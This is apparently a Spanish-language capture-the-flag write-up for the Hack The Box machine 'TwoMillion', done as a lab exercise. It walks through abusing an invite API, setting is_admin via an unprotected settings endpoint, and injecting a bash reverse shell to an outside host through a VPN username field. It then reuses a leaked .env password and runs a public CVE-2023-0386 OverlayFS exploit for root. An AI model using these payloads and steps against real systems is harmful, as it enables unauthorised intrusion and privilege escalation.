---
title: "TwoMillion"
layout: single
excerpt: ""
header:
show_date: true
classes: wide
header:
  teaser: "/assets/images/htb-writeup-twomillion/TWOMILLION.png"
  teaser_home_page: true
  icon: "https://user-images.githubusercontent.com/69093629/125662338-fd8b3b19-3a48-4fb0-b07c-86c047265082.png"
categories:
  - HackTheBox
tags:

  - eWPT
  - OSWE
  - Abusing declared Javascript functions from the browser console
  - Abusing the API to generate a valid invite code
  - Abusing the API to elevate our privilege to administrator
  - Command injection via poorly designed API functionality
  - Information Leakage
  - Privilege Escalation via Kernel Exploitation (CVE-2023-0386) - OverlayFS Vulnerability

date: 2024-06-11 
---


![](/assets/images/htb-writeup-twomillion/TWOMILLION.png)


## Enumeración 

Lo primero que voy a hacer es si la máquina se encuentra encendida.

```bash
❯ ping -c 1 10.10.11.221
PING 10.10.11.221 (10.10.11.221) 56(84) bytes of data.
64 bytes from 10.10.11.221: icmp_seq=1 ttl=63 time=130 ms

--- 10.10.11.221 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 129.898/129.898/129.898/0.000 ms


❯ whichSystem.py 10.10.11.221

	10.10.11.221 (ttl -> 63): Linux

```
Veo que me responde. Gracias al ttl identifico que estoy ante una máquina Linux.

Ahora voy a hacer una enummeración con nmap para escanear todos los puertos (-p-) abiertos (--open) con un Stealth Scan (-sS), que permite un escaneo más rápido y sigiloso, junto con un --min-rate de 5000 para tramitar 5000 paquetes/segundo. Le incluyo también un triple verbose (-vvv) para que vaya mostrando por consola los puertos abiertos sin necesidad de que el escaneo concluya, y no quiero que aplique resolución DNS (-n) ni el descubrimiento/detección de hosts (-Pn). Por último lo exporto a formato grepeable (-oG).

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.221 -oG puertos

❯ cat puertos
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: puertos
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Mon Jun 10 05:46:46 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG puertos 10.10.11.221
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 10.10.11.221 ()   Status: Up
   4   │ Host: 10.10.11.221 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
   5   │ # Nmap done at Mon Jun 10 05:47:02 2024 -- 1 IP address (1 host up) scanned in 16.17 seconds

❯ extractPorts puertos
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.11.221
   5   │     [*] Open ports: 22,80

```

Una vez tenemos los puertos abiertos vamos a escanear esos 2 puertos lanzando unos scripts básicos de reconocimiento (-sC) y tratar de determinar la versión y servicio (-sV). Luego lo voy a exportar en formato nmap (-oN).

```bash
❯ nmap -p22,80 -sC -sV 10.10.11.221 -oN objetivo


❯ cat objetivo -l java
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: objetivo
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Mon Jun 10 05:51:50 2024 as: nmap -p22,80 -sC -sV -oN objetivo 10.10.11.221
   2   │ Nmap scan report for 10.10.11.221
   3   │ Host is up (0.15s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
   9   │ |_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
  10   │ 80/tcp open  http    nginx
  11   │ |_http-title: Did not follow redirect to http://2million.htb/
  12   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  13   │ 
  14   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

```bash
❯ ping -c 1 2million.htb
ping: 2million.htb: Name or service not known
```

Voy a incluir http://2million.htb/ en mi archivo /etc/hosts para que sea capaz de encontrar la página.

Hay muchos botones que no son funcionales. Los que nos interesan son el de [join](http://2million.htb/invite) y el de [login](http://2million.htb/login).

![](/assets/images/htb-writeup-twomillion/1.png)

Si miramos el código fuente encontramos unos scripts

![](/assets/images/htb-writeup-twomillion/2.png)

Vamos a intentar ver el de inviteapi.min.js pero encuentro el código ofuscado
![](/assets/images/htb-writeup-twomillion/3.png)

Con [d4js](https://lelinhtinh.github.io/de4js/) podemos desofuscarlo.

![](/assets/images/htb-writeup-twomillion/6.png)

Encuentro 2 funciones de JS que se utilizan para realizar socilitudes al servidor. Una que te da un endpoint de como generar el código y otra que toma como parámetro el code para verificarlo.
Ya puedo empezar a probar tirando de esos endpoints.



Antes, en la consola del navegador voy a usar `this`, que en js se refiere al objecto actual que se está ejecutando en el código. Si ejecutas "this" en la consola del navegador web, devolverá el objeto global, que es `window` en el contexto del navegador.

![](/assets/images/htb-writeup-twomillion/4.png)

Encontramos la función que genera el código de invitación. Cuando ejecuto `makeInviteCode()` se interactua con alguna API o función en la web que devuelve un JSON como respuesta. La respuesta está cifrada con `ROT13`. ROT13 es un cifrado simple que rota (de ahí el nombre) cada letra 13 lugares. Es decir, cada letra se sustitutye por otra letra que esté 13 lugares más adelante. (Ejemplo, "a" se convierte en "n", "z" se convierte en "m"). Ahi páginas, como [esta](https://cryptii.com/pipes/rot13-decoder) que lo descifra.

![](/assets/images/htb-writeup-twomillion/5.png)

Y nos da el mismo endpoint que antes. Voy a usar `curl` para realizar una solicitud y recibir respuesta del servidor. 

```bash
❯ curl -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"SjZXRkgtVDJRTjgtS0o5WlktMklPM04=","format":"encoded"}}%   
```

Obtengo una respuesta exitosa que me devuelve en formato JSON con el valor de code que parece que está codificado en base 64.
Con base64 podemos decodificar la cadena y ver su contenido
```bash
❯ echo "SjZXRkgtVDJRTjgtS0o5WlktMklPM04=" | base64 -d; echo

J6WFH-T2QN8-KJ9ZY-2IO3N
```

Ahora si pongo este invite code me deja crear una cuenta 

![](/assets/images/htb-writeup-twomillion/7.png)

## Explotación 

Voy a intentar conseguir más endpoints pasándole mi cookie y la ruta hasta /api/v1 para que busque apartir de ahí.
Utilizo -s (silent) para que suprima la salida de progreso y solo muestre la de repsuesta y -H para customizar la header donde pondremos la cookie. 

```bash
❯ curl "http:/2million.htb/api/v1" -s -H "Cookie: PHPSESSID=03rj5gb2bmuojkcoh8diaki5vm" | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}

```

También se puede ver desde el navegador

![](/assets/images/htb-writeup-twomillion/8.png)

Si probamos a ver que nos devuelve el navegador al entrar a la ruta de admin.

```bash
❯ curl -s -X GET "http://2million.htb/api/v1/admin/auth" -H "Cookie: PHPSESSID=5a2jtf8ii4cqbc8m7097kj74n0" | jq
{
  "message": false
}
```

Por tanto entiendo que no soy admin. Voy a intentar generar una vpn para un usuario por POST.
```bash
❯ curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=5a2jtf8ii4cqbc8m7097kj74n0" -v | jq
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.221
*   Trying 10.10.11.221:80...
* Connected to 2million.htb (10.10.11.221) port 80
> POST /api/v1/admin/vpn/generate HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.7.1
> Accept: */*
> Cookie: PHPSESSID=5a2jtf8ii4cqbc8m7097kj74n0
> 
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< Server: nginx
< Date: Mon, 10 Jun 2024 19:43:10 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [5 bytes data]
* Connection #0 to host 2million.htb left intact
```
Nos dice unauthorized. Voy a probar el endpoint de cambiar las características de un usuario

```bash
❯ curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=5a2jtf8ii4cqbc8m7097kj74n0" | jq
{
  "status": "danger",
  "message": "Invalid content type."
}
```
<i>También podemos ver el mensaje pasando por nuestro proxy usando Burpsuite y ver que nos devuelve la respuesta, que es lo mismo que hemos hecho con curl.<i>
![](/assets/images/htb-writeup-twomillion/9.png)

Nos dice `invalid content type`. Cuando estamos trabajando con APIs el content type que solemos usar es el de JSON. Voy a añadir el `Content-Type: application/json` al head a ver que nos devuelve.

![](/assets/images/htb-writeup-twomillion/10.png)

Nos dice que nos falta el parametro email. Voy a ponerlo

![](/assets/images/htb-writeup-twomillion/11.png)


Ahora nos pide otro parámetro. Voy a poner 1 (true).


![](/assets/images/htb-writeup-twomillion/12.png)


<i>Con curl se podría haber sacado con este comando</i>

```bash
❯ curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=5a2jtf8ii4cqbc8m7097kj74n0" -H "Content-Type: application/json" -d '{"email":"hi@hi.com","is_admin":1}'| jq
{
  "id": 14,
  "username": "hi",
  "is_admin": 1
}
```

Parece que ya tenemos administrador, vamos a comprobarlo con el endpoint que habíamos enumerado anteriormente.

![](/assets/images/htb-writeup-twomillion/13.png)

Y efectivamente somos admin. Antes  no me dejaba generar una vpn para un usuario. Voy a probar ahora
```bash
❯ curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=5a2jtf8ii4cqbc8m7097kj74n0" | jq
{
  "status": "danger",
  "message": "Invalid content type."
}
```
Ahora vemos como nos responde distinto que antes. Vamos a volver a añadir el Content-Type que nos pide.

![](/assets/images/htb-writeup-twomillion/14.png)

Y un usuario nos pide ahora

![](/assets/images/htb-writeup-twomillion/15.png)

Nos genera la VPN para el usuario. Este campo usuario parece vulnerable. Voy a probar a inyectar comandos separándolos por ;

![](/assets/images/htb-writeup-twomillion/16.png)

Y efectivamente, asi que voy a hacer una reverse shell

![](/assets/images/htb-writeup-twomillion/17.png)

<i> Con Curl sería así:</i>

```bash
❯ curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=5a2jtf8ii4cqbc8m7097kj74n0" -H "Content-Type: application/json" -d '{"username":"hi;bash -c \"bash -i >& /dev/tcp/10.10.14.160/443 0>&1\";"}'
```

Ahora hago el tratamiento de la tty como siempre.

![](/assets/images/htb-writeup-twomillion/18.png)

Esto reinicia la terminal actual y ahora puedes hacer cntrl + c sin que se vaya la máquina. Si queremos que vaya el control + l hacemos lo siguiente.

```bash
www-data@2million:~/html$ echo $TERM
dumb
www-data@2million:~/html$ export TERM=xterm  
www-data@2million:~/html$ echo $TERM
xterm
```

Por último para modificar el size del stty que es para que se vea bien el editor nano escribimos el siguiente comando
```bash
www-data@2million:~/html$ stty size
24 80
www-data@2million:~/html$ stty rows 44 columns 184
www-data@2million:~/html$ stty size
44 184
```
Vamos a buscar a ver que encontramos

```bash
www-data@2million:~/html$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Jun 10 22:40 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Jun 10 22:40 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
www-data@2million:~/html$ 
```

Pues un archivo .env con el nombre de la base de datos y con el usuario y la pass.

De todas formas voy a mirar a ver que usuarios hay dentro de esta máquina

```bash
www-data@2million:~/html$ ls -l /home/
total 4
drwxr-xr-x 4 admin admin 4096 Jun  6  2023 admin
www-data@2million:~/html$ su admin
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

Y probando con la contraseña consigo acceso a dicho usuario

```bash
admin@2million:/var/www/html$ whoami
admin
```


<div style="text-align: center;">
    <b><span style="color: #98FB98;">USER FLAG</span></b>
    <br>
    ---------------------------
</div>

```bash
admin@2million:~$ ls
user.txt
admin@2million:~$ cat user.txt 
7f9dffcf5eadf4f1a929d8d7d25e6609
```

Voy a conectarme por ssh para tener una shell más cómoda
```bash
❯ ssh admin@10.10.11.221
The authenticity of host '10.10.11.221 (10.10.11.221)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.221' (ED25519) to the list of known hosts.
admin@10.10.11.221's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jun 10 09:10:12 PM UTC 2024

  System load:           0.08544921875
  Usage of /:            75.7% of 4.82GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             222
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.221
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c862

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Mon Jun 10 21:10:13 2024 from 10.10.16.29
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ 
```

Si leemos todo bien nos dice, you have mail

```bash
admin@2million:~$ cd /var/mail
admin@2million:/var/mail$ ls
admin
admin@2million:/var/mail$ cat admin 
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
admin@2million:/var/mail$ 
```

## Escalada de privilegios

El correo solicita que, además de la migración de la base de datos en curso, se actualice el sistema operativo del servidor web debido a vulnerabilidades serias en el kernel de Linux este año, especialmente una en OverlayFS / FUSE.

Voy a usar este [repo](https://github.com/sxlmnwb/CVE-2023-0386) para intentar explotarlo

```bash
❯ git clone https://github.com/sxlmnwb/CVE-2023-0386.git
Cloning into 'CVE-2023-0386'...
remote: Enumerating objects: 13, done.
remote: Counting objects: 100% (13/13), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 13 (delta 2), reused 13 (delta 2), pack-reused 0
Receiving objects: 100% (13/13), 8.89 KiB | 379.00 KiB/s, done.
Resolving deltas: 100% (2/2), done.
❯ zip comprimido.zip -r CVE-2023-0386

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Me hago un comprimido para pasármelo a la máquina en un servidor http con python

```bash
admin@2million:/tmp$ wget http://10.10.14.160/comprimido.zip
--2024-06-10 23:11:25--  http://10.10.14.160/comprimido.zip
Connecting to 10.10.14.160:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43518 (42K) [application/zip]
Saving to: ‘comprimido.zip.1’

comprimido.zip.1                                0%[                                                                                                  ]       0  --.-KB/s            comprimido.zip.1                              100%[=================================================================================================>]  42.50K  91.4KB/s            comprimido.zip.1                              100%[=================================================================================================>]  42.50K  91.4KB/s    in 0.5s    

2024-06-10 23:11:26 (91.4 KB/s) - ‘comprimido.zip.1’ saved [43518/43518]
```

Lo descomprimimos y ejecutamos el comando make all que nos decia en el repo de github

```bash
admin@2million:/tmp/CVE-2023-0386$ make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
fuse.c: In function ‘read_buf_callback’:
fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ {aka ‘long int’} [-Wformat=]
  106 |     printf("offset %d\n", off);
      |                    ~^     ~~~
      |                     |     |
      |                     int   off_t {aka long int}
      |                    %ld
fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ {aka ‘long unsigned int’} [-Wformat=]
  107 |     printf("size %d\n", size);
      |                  ~^     ~~~~
      |                   |     |
      |                   int   size_t {aka long unsigned int}
      |                  %ld
fuse.c: In function ‘main’:
fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]
  214 |     while (read(fd, content + clen, 1) > 0)
      |            ^~~~
      |            fread
fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
  216 |     close(fd);
      |     ^~~~~
      |     pclose
fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]
  221 |     rmdir(mount_path);
      |     ^~~~~
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
(.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
admin@2million:/tmp/CVE-2023-0386$ ls
exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  test
```


Ahora ejecuto el siguiente comando
```bash
admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
mkdir: File exists
fuse: mountpoint is not empty
fuse: if you are sure this is safe, use the 'nonempty' mount option
fuse_mount: File exists

admin@2million:/tmp/CVE-2023-0386$ ./fuse nonempty ./ovlcap/lower ./gc
[+] len of gc: 0x0

```
Y ahora ejecuto la segunda terminal .
```bash
admin@2million:~$ cd /tmp/CVE-2023-0386/ 
admin@2million:/tmp/CVE-2023-0386$ ./exp 
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jun 10 23:14 .
drwxr-xr-x 6 root   root     4096 Jun 10 23:19 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386# whoami
root
```
<div style="text-align: center;">
    <b><span style="color: #98FB98;">R00T FLAG</span></b>
    <br>
    ---------------------------
</div>

```bash
root@2million:~# find / -name root.txt
find: ‘/tmp/CVE-2023-0386/nonempty’: Permission denied
find: ‘/tmp/CVE-2023-0386/ovlcap/lower’: Permission denied
/root/root.txt
root@2million:~# cat /root/root.txt
5d7c7780165ae6ec2958a2a063e33652
```